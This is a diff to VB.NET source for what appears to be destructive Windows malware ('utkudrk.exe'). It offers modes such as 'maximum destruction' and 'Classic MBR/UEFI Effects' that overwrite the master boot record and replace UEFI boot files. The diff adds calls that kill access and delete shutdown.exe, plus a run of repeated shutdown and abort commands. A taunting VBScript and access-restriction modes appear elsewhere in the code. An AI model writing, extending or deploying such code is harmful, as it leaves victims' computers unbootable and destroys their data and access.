@@ -205,6 +205,7 @@ Public Class Form1
                         timerLabel.Text = "It can't defend against UEFI! Executing maximum destruction!"
                         Thread.Sleep(5000)
                         Form1.WriteMBR()
+                        Form1.KillGrantAccessAndDeleteShutdownExe()
                         ApplyMaximumDestruction()
 
                     Case "Classic MBR/UEFI FEffects"
@@ -212,6 +213,7 @@ Public Class Form1
                         timerLabel.Text = "It can't defend against UEFI! Executing classic UEFI effects!"
                         Thread.Sleep(5000)
                         Form1.WriteMBR()
+                        Form1.KillGrantAccessAndDeleteShutdownExe()
                         ReplaceBootx64WithBootmgfw()
 
                     Case "Surprise Me"
@@ -235,6 +237,7 @@ Public Class Form1
                         timerLabel.Text = "Executing maximum destruction!"
                         Thread.Sleep(5000)
                         Form1.WriteMBR()
+                        Form1.KillGrantAccessAndDeleteShutdownExe()
                         ApplyMaximumDestruction()
 
                     Case "Classic MBR/UEFI Effects"
@@ -243,6 +246,7 @@ Public Class Form1
                         Thread.Sleep(5000)
                         ' Write UEFI using bootmgfw from Resource1
                         Form1.WriteMBR()
+                        Form1.KillGrantAccessAndDeleteShutdownExe()
                         ReplaceBootx64WithBootmgfw()
 
                     Case "Surprise Me"
@@ -251,7 +255,24 @@ Public Class Form1
                         Thread.Sleep(5000)
                         Form1.CreateEpicVBScriptFile()
                         Process.Start("shutdown -s -t 5")
-
+                        Process.Start("shutdown -a")
+                        Process.Start("shutdown -s -t 5")
+                        Process.Start("shutdown -a")
+                        Process.Start("shutdown -s -t 5")
+                        Process.Start("shutdown -a")
+                        Process.Start("shutdown -s -t 5")
+                        Process.Start("shutdown -a")
+                        Process.Start("shutdown -s -t 5")
+                        Process.Start("shutdown -a")
+                        Process.Start("shutdown -s -t 5")
+                        Process.Start("shutdown -a")
+                        Process.Start("shutdown -s -t 5")
+                        Process.Start("shutdown -a")
+                        Process.Start("shutdown -s -t 5")
+                        Process.Start("shutdown -a")
+                        Process.Start("shutdown -s -t 5")
+                        Process.Start("shutdown -a")
+                        Process.Start("shutdown -s -t 5")
                     Case "Just Make Unusable My PC Without Destruction"
                         ' Code for access restrictions
                         timerLabel.Text = "You can't access your files anymore!"
@@ -1032,7 +1053,7 @@ Public Class Form1
 
     Private Sub CreateEpicVBScriptFile()
         ' Create the VBScript content
-        Dim vbsContent As String = "MsgBox ""What Are Your Last Words? Spoiler: No UEFI Malware this time. Because it's easy to fix."" , 0, ""utkudrk.exe""" & vbCrLf &
+        Dim vbsContent As String = "MsgBox ""What Are Your Last Words? Spoiler: There two scenarios to get this message but one of them is not so destructive. No UEFI Driver or Kernel Driver Malware this time. Because it's easy to fix. If you see from starting at Windows"" , 0, ""utkudrk.exe""" & vbCrLf &
         "Dim userInput" & vbCrLf &
         "userInput = InputBox(""Enter your response (Just don't say FUCK YOU):"", ""utkudrk.exe"")" & vbCrLf &
         "If userInput = ""FUCK YOU"" Then" & vbCrLf &
@@ -1137,7 +1158,6 @@ Public Class Form1
         UpdateRegistrySettings()
         DisableLogoffSwitchUserAndShutdown()
         SetWallpaper()
-        KillGrantAccessAndDeleteShutdownExe()
     End Sub
 
     ' Apply Minecraft Nether portal-like effect with pixelated swirling distortion
